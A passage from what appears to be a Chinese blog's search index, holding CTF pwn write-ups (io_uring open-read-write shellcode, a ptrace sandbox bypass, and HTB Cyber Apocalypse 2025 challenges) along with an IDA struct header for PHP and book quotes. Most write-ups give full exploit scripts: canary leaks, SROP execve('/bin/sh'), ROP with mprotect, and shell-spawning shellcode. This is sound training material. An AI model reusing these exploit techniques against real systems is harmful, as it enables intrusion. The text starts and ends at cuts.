","date":"2025-08-23","objectID":"/posts/io_uring/:2:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#actf-2023-master-of-rop"},{"categories":["pwn"],"collections":null,"content":"确定内核版本\r首先需要确定内核版本 确定内核版本的方法： 以我本地为例，我的内核版本 6.6.87，但是我去调用一些新内核版本才有的系统调用： shellcode = asm(''' mov rax, 454 xor rdi, rdi xor rsi, rsi xor rdx, rdx syscall ''') 这个syscall的返回值存在RAX是：0xffffffffffffffda，在 64 位有符号数下就是 -38。表示 syscall 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在。 远程的话不会回显，可以通过 cmp rax, -38判断，如果ENOSYS就wirte一些信息 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:1","tags":null,"title":"io_uring","uri":"/posts/io_uring/#确定内核版本"},{"categories":["pwn"],"collections":null,"content":"寻找代替系统调用\r由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw 别人测得的版本小于 6.1.60 以 linux-5.15.137 为参考 深入SYS_openat后发现，其主要逻辑是调用do_filp_open，而do_file_open又会被io_uring.c这个文件调用。 了解io_uring之后发现其能够替代orw，至此，确定了通过io_uring实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:2:2","tags":null,"title":"io_uring","uri":"/posts/io_uring/#寻找代替系统调用"},{"categories":["pwn"],"collections":null,"content":"实现\rliburing提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") p.recvuntil(b'code\\n') # dbg() p.send(shellcode) p.interactive() 可能要多打几次才能打通 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:3","tags":null,"title":"io_uring","uri":"/posts/io_uring/#实现"},{"categories":["pwn"],"collections":null,"content":"参考文章\rhttps://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs https://kernel.dk/io_uring.pdf [译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020） 星盟WP ","date":"2025-08-23","objectID":"/posts/io_uring/:3:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#参考文章"},{"categories":["phppwn"],"collections":null,"content":"相关结构体修复 在phppwn逆向的时候，常遇到类似这样的东西： 其实它是对传入参数的类型进行判断，但是看起来并不太直观。 IDA中支持导入C头文件，修复一些结构体 经过修复： if ( v15-\u003eu1.v.type == IS_ARRAY ) { if ( v16-\u003eu1.v.type == IS_STRING ) { 这是我用的导入php一些常用结构体到IDA的头文件 这个头文件有些地方不太完善，但是用起来没什么大问题 //php_struct.h //定义基本类型 typedef unsigned char uint8_t; typedef unsigned short uint16_t; typedef unsigned int uint32_t; typedef unsigned long long uint64_t; typedef long long int64_t; typedef unsigned char zend_uchar; typedef long long zend_long; typedef unsigned long zend_ulong; //zval.u1.type类型 typedef enum { IS_NULL = 0, IS_FALSE = 1, IS_TRUE = 2, IS_LONG = 4, IS_DOUBLE = 5, IS_STRING = 6, IS_ARRAY = 7, IS_OBJECT = 8, IS_RESOURCE = 9, IS_REFERENCE = 10, IS_CONSTANT = 11, IS_CONSTANT_AS = 12, _IS_BOOL = 13, IS_CALLABLE = 14, IS_INDIRECT = 15, IS_PTR = 17 } zend_type; //前置声明 typedef struct _zval_struct zval; typedef struct _zend_array HashTable; typedef struct _zend_string zend_string; typedef struct _zend_object zend_object; typedef struct _zend_resource zend_resource; typedef struct _Bucket Bucket; typedef void (*dtor_func_t)(zval *pDest); typedef struct _zend_reference zend_reference; typedef struct _zend_ast_ref zend_ast_ref; typedef struct _zend_object_handlers zend_object_handlers; typedef struct _zend_class_entry zend_class_entry; typedef union _zend_function zend_function; typedef struct _zend_refcounted_v zend_refcounted_v; //zend_refcounted_h typedef struct _zend_refcounted_v { uint8_t type; uint8_t flags; uint16_t gc_info; } zend_refcounted_v; typedef union _zend_refcounted_u { zend_refcounted_v v; uint32_t type_info; } zend_refcounted_u; typedef struct _zend_refcounted_h { uint32_t refcount; zend_refcounted_u u; } zend_refcounted_h; //_zend_string typedef struct _zend_string { zend_refcounted_h gc; // 8字节 uint64_t h; // 8字节 uint32_t len; // 4字节 char val[1]; // 1字节（+3字节padding，对齐到8） }string; typedef struct _zval_u1_v { uint8_t type; uint8_t type_flags; uint8_t const_flags; uint8_t reserved; } zval_u1_v; typedef union _zval_u1 { zval_u1_v v; uint32_t type_info; } zval_u1; typedef union _zval_u2 { uint32_t var_flags; uint32_t next; uint32_t cache_slot; uint32_t lineno; uint32_t num_args; uint32_t fe_pos; } zval_u2; //这里一些对象使用void*避免具体类型 typedef union _zend_value { zend_long lval; double dval; void *counted; zend_string *str; HashTable *arr; zend_object *obj; zend_resource *res; zend_reference *ref; zend_ast_ref *ast; _zval_struct *zv; void *ptr; zend_class_entry *ce; zend_function *func; struct { uint32_t w1; uint32_t w2; } ww; } zend_value; typedef struct _zval_struct { zend_value value; // 8字节 zval_u1 u1; // 4字节 zval_u2 u2; // 4字节 }zval; //_zend_array typedef struct _Bucket { _zval_struct val; zend_ulong h; _zend_string *key; }Bucket; typedef struct _zend_array_v { zend_uchar flags; zend_uchar nApplyCount; zend_uchar nIteratorsCount; zend_uchar reserve; }_zend_array_v; typedef union _zend_array_u { _zend_array_v v; uint32_t flag; }_zend_array_u; typedef struct _zend_array { zend_refcounted_h gc; //8字节 _zend_array_u u; uint32_t nTableMask; Bucket *arData; uint32_t nNumUsed; uint32_t nNumOfElements; uint32_t nTableSize; uint32_t nInternalPointer; zend_long nNextFreeElement; dtor_func_t pDestructor; }HashTable; //_zend_resource typedef struct _zend_resource { zend_refcounted_h gc; int handle; int type; void *ptr; }zend_resource; //_zend_object typedef struct _zend_object { zend_refcounted_h gc; uint32_t handle; zend_class_entry *ce; const zend_object_handlers *handlers; HashTable *properties; _zval_struct properties_table[1]; }zend_object; typedef _zend_array array; 导入方式：File -\u003e Load file -\u003e Parse C header file，然后选择这个头文件导入。 导入后就能看到Local Types中有相关的结构体 使用方式：右键需要convert的变量，选择Convert to struct *... 其中常用的结构体有：zval、string、array 至于相关变量结构体改成类似IS_ARRAY。 右键需要改的数字，选择Enum，选择zend_type ","date":"2025-08-14","objectID":"/posts/phppwn_re_struct/:0:0","tags":null,"title":"phppwn逆向","uri":"/posts/phppwn_re_struct/#"},{"categories":["WP"],"collections":null,"content":"canon_event\rptrace + 沙箱绕过 int __fastcall main(int argc, const char **argv, const char **envp) { void *v3; // rbx void *v4; // rax void *v5; // r12 unsigned int uint; // ebp v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0); v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0); if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) ) err(1, \"mmap failed\"); printf(\"code size: \"); uint = get_uint(); // 输入shellcode长度 if ( uint \u003e 0x1000 ) // shellcode长度大于0x1000就报错 { puts(\"invalid code size\"); exit(1); } printf(\"enter shellcode: \"); if ( read(0, v3, uint) \u003c 0 ) // 读入shellcode err(1, \"read failed\"); if ( mprotect(v3, 0x1000u, 5) \u003c 0 ) err(1, \"mprotect failed\"); isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode return 0; } line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x0000000c A = instruction_pointer \u003e\u003e 32 0001: 0x35 0x04 0x00 0x00008000 if (A \u003e= 0x8000) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x02 0x00 0x0000003d if (A == wait4) goto 0006 0004: 0x15 0x01 0x00 0x00000065 if (A == ptrace) goto 0006 0005: 0x15 0x00 0x01 0x00000039 if (A != fork) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS 只允许三个系统调用：wait4、ptrace、fork exp: #!/usr/bin/env python3 from pwn import * from time import sleep exe = ELF(\"./pwn\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.binary = exe def dbg(r): gdb.attach(r) pause() # DOCKER_PORT = 1337 # REMOTE_NC_CMD = \"nc localhost 444\" # `nc \u003chost\u003e \u003cport\u003e` bstr = lambda x: str(x).encode() ELF.binsh = lambda self: next(self.search(b\"/bin/sh\\0\")) GDB_SCRIPT = \"\"\" set follow-fork-mode child set follow-exec-mode same c \"\"\" def main(): r = process(\"./pwn\") PTRACE_CONT = 7 PTRACE_GETREGS = 12 PTRACE_SETREGS = 13 PTRACE_SYSCALL = 24 RIP_OFFSET = 8*16 shellcode = asm(f\"\"\" mov eax, SYS_fork syscall test eax, eax jz child mov r13, rax mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 mov rsi, rsp xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall lea rdi, [rip+sendfile] lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall hlt child: mov eax, SYS_ptrace xor edi, edi xor esi, esi xor edx, edx xor r10, r10 syscall int3 open: mov eax, SYS_open lea rdi, [rip+flag] xor esi, esi xor edx, edx syscall sendfile: mov rax, SYS_sendfile mov rdi, 1 mov rsi, 3 xor edx, edx mov r10, 0x50 syscall hlt flag: \"\"\") + b\"flag.txt\\0\" dbg(r) r.sendline(bstr(len(shellcode))) r.send(shellcode) r.interactive() if __name__ == \"__main__\": main() shellcode解释： SYS_fork parent_process: wait4 //等待TRACEME PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall wait4 //等待open的syscall开始 PTRACE_GETREGS //获取寄存器信","date":"2025-08-07","objectID":"/posts/trxctf2025/:1:0","tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#canon_event"},{"categories":["WP"],"collections":null,"content":"Virtual_Insanity\r栈溢出+利用vsyscall 就不写了。。。 ","date":"2025-08-07","objectID":"/posts/trxctf2025/:2:0","tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#virtual_insanity"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r“为什么人很容易飘飘然？因为你浅薄呀 浅薄的东西就是容易飘起来” ——罗翔\rquote\r“我们画不出那个完美的圆，但是我们仍然应当努力，虽不能至心向往之”\rquote\r“我们每个人都并不优越于他人，每个人都是有限的。我们时常需要聆听苏格拉底的德尔菲神谕，承认自己的无知和有限，渺小和幽暗”\rquote\r“本质上，过分的夸奖与过分的批评不都是误解吗？误解本来就是人生常态，不要喜欢好听的误解，而厌恶不好听的误解。”\r","date":"2025-08-06","objectID":"/posts/read_fzdxj/:1:0","tags":null,"title":"《法治的细节》","uri":"/posts/read_fzdxj/#摘录"},{"categories":["WP"],"collections":null,"content":" HTB的一个比赛 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:0:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#"},{"categories":["WP"],"collections":null,"content":"Quack_Quack\runsigned __int64 duckling() { char *v1; // [rsp+8h] [rbp-88h] _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF unsigned __int64 v4; // [rsp+88h] [rbp-8h] v4 = __readfsqword(0x28u); memset(buf, 0, sizeof(buf)); memset(v3, 0, 80); printf(\"Quack the Duck!\\n\\n\u003e \"); fflush(_bss_start); read(0, buf, 0x66u); v1 = strstr((const char *)buf, \"Quack Quack \"); if ( !v1 ) { error(\"Where are your Quack Manners?!\\n\"); exit(1312); } printf(\"Quack Quack %s, ready to fight the Duck?\\n\\n\u003e \", v1 + 32); read(0, v3, 0x6Au); puts(\"Did you really expect to win a fight against a Duck?!\\n\"); return v4 - __readfsqword(0x28u); } unsigned __int64 duck_attack() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator\\n\"); exit(1); } while ( read(fd, \u0026buf, 1u) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#quack_quack"},{"categories":["WP"],"collections":null,"content":"strstr函数\r#include \u003cstring.h\u003e char *strstr(const char *haystack, const char *needle); 功能：在 haystack（主字符串）中查找 needle（子字符串）的首次出现位置。 返回值： 找到时：返回指向首次匹配位置的指针。 未找到时：返回 NULL。 char *s = \"Hello_CTF_World\"; char *p = strstr(s, \"CTF\"); // p 指向 \"CTF_World\" ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strstr函数"},{"categories":["WP"],"collections":null,"content":"思路\r通过strstr函数，控制v1指针 让v1+32指向canary，第20行的printf会输出canary read进canary、控制返回地址到duck_attack，输出flag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './quack_quack' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x40137F #canary会以\\x00结尾，所以要加个1 p.recvuntil(b'Quack the Duck!\\n\\n\u003e ') pl = b'a'*(0x80 - 0x8 - 0x20 + 1) + b\"Quack Quack \" # dbg() p.send(pl) p.recvuntil(b'Quack Quack ') canary = u64(p.recv(7).rjust(8,b'\\x00')) #在低位补\\x00 success(\"canary---\u003e 0x%x\",canary) pl = b'a'*(0x60 - 0x8) pl+= p64(canary) pl+=p64(0xdeedbeef) pl+= p16(0x137f) # dbg() p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:3","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp"},{"categories":["WP"],"collections":null,"content":"blessing\rint __fastcall main(int argc, const char **argv, const char **envp) { size_t size; // [rsp+8h] [rbp-28h] BYREF unsigned __int64 i; // [rsp+10h] [rbp-20h] _QWORD *v6; // [rsp+18h] [rbp-18h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setup(argc, argv, envp); banner(); size = 0; v6 = malloc(0x30000u); *v6 = 1; printstr( \"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\\n\" \"\\n\" \"Please accept this: \"); printf(\"%p\", v6); sleep(1u); for ( i = 0; i \u003c= 0xD; ++i ) { printf(\"\\b \\b\"); usleep(0xEA60u); } puts(\"\\n\"); printf( \"%s[%sBard%s]: Now, I want something in return...\\n\\nHow about a song?\\n\\nGive me the song's length: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); __isoc99_scanf(\"%lu\", \u0026size); buf = malloc(size); printf(\"\\n%s[%sBard%s]: Excellent! Now tell me the song: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); read(0, buf, size); *(_QWORD *)((char *)buf + size - 1) = 0; write(1, buf, size); if ( *v6 ) printf(\"\\n%s[%sBard%s]: Your song was not as good as expected...\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;32m\", \"\\x1B[1;31m\"); else read_flag(); return 0; } man malloc RETURN VALUE The malloc(), calloc(), realloc(), and reallocarray() functions return a pointer to the allocated memory, which is suitably aligned for any type that fits into the requested size or less. On error, these functions return NULL and set errno. Attempting to allocate more than PTRDIFF_MAX bytes is considered an error, as an object that large could cause later pointer subtraction to overflow. ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#blessing"},{"categories":["WP"],"collections":null,"content":"思路\r程序会输出heap_addr heap_addr很大，malloc(heap_addr)的时候，系统直接拒绝，返回NULL 所以可以控制 (_QWORD *)((char *)buf + size - 1) = v6 就可以让 *v6 = 0，去readflag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-1"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './blessing' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) p.recvuntil(b'Please accept this: ') heap_addr = int(p.recv(14),16) success(\"heap_addr = 0x%x\",heap_addr) # dbg() p.sendlineafter(b'length: ',str(heap_addr +1)) p.send(b'a') p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-1"},{"categories":["WP"],"collections":null,"content":"laconic\r考察SROP 程序就几句汇编 public _start _start proc near mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 106h syscall ; LINUX - retn _start endp 可以发现有栈溢出 有发现binsh，但是IDA里没显示 pwndbg\u003e search \"/bin/sh\" Searching for value: '/bin/sh' laconic 0x43238 0x68732f6e69622f /* '/bin/sh' */ 直接execve(\"/bin/sh\",0,0)就可以了 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#laconic"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './laconic' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) binsh = 0x43238 pop_rax_ret = 0x43018 syscall_ret = 0x43015 pl = b'a'*8 pl+= p64(pop_rax_ret) pl+= p64(15) pl+=p64(syscall_ret) frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = binsh frame.rsi = 0x0 frame.rdx = 0x0 frame.rip = syscall_ret pl+= bytes(frame) p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-2"},{"categories":["WP"],"collections":null,"content":"crossbow\r查看两个关键函数 __int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { __int64 v6; // rdx __int64 v7; // rcx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", a5, a6); target_dummy((__int64)v13, (__int64)\"\\x1B[1;34m\", v6, v7, v8, v9); return printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: That was quite a shot!!\\n\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", v10, v11); } //这里我省略了一些无关代码 __int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _QWORD *v12; // rbx int v13; // r8d int v14; // r9d __int64 result; // rax int v16; // r8d int v17; // r9d int v18; // [rsp+1Ch] [rbp-14h] BYREF if ( (unsigned int)scanf((unsigned int)\"%d%*c\", (unsigned int)\u0026v18, v6, v7, v8, v9) != 1 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v10, v11); exit(1312); } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); if ( !*v12 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: We do not want cowards here!!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v13, v14); exit(6969); } result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE); return result; } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); 这里的v18可以通过前面的scanf控制，a1是caller函数（training）的变量v13。v13-0x10(a1-0x10)是target函数(callee)的rbp 这里把v18设置成-0x10，那么，target函数leave;ret的时候，training函数的rbp和training函数的返回地址就会被我们控制(通过fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE);) ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#crossbow"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './crossbow' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) pop_rax_ret = 0x401001 pop_rdi_ret = 0x401d6c pop_rsi_ret = 0x40566b pop_rdx_ret = 0x401139 syscall_ret = 0x404b51 #mprotect 0xa read 0 fgets = 0x401CC0 stdin = 0x40E020 mprotect_addr = 0x40a320 # dbg() p.recvuntil(b'shoot: ') p.sendline(b'-2') #mprotect给bss段权限7，read读入shellcraft.sh进bss #然后执行shellcode p.recvuntil(b'\u003e ') #mprotect(0x40e000,0x1000,7) pl = b'a'*8 pl += p64(pop_rdi_ret) + p64(0x40e000) pl+= p64(pop_rsi_ret) + p64(0x1000) pl+= p64(pop_rdx_ret) + p64(7) pl+= p64(mprotect_addr) pl+= p64(pop_rdi_ret) + p64(0x40E220) pl+= p64(pop_rsi_ret) + p64(0x100) pl+= p64(pop_rdx_ret) + p64(stdin) pl+= p64(fgets) pl+= p64(0x40e221) # dbg() p.send(pl) # dbg() p.send(asm(shellcraft.sh())) p.interactive() 这里执行shellcode的地址是0x40e221 pwndbg\u003e disassemble /r 0x40e220, 0x40e250 Dump of assembler code from 0x40e220 to 0x40e250: 0x000000000040e220 \u003ccompleted+0\u003e: 00 6a 68 add BYTE PTR [rdx+0x68],ch 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 0x000000000040e22d \u003c__sysinfo+5\u003e: 00 00 add 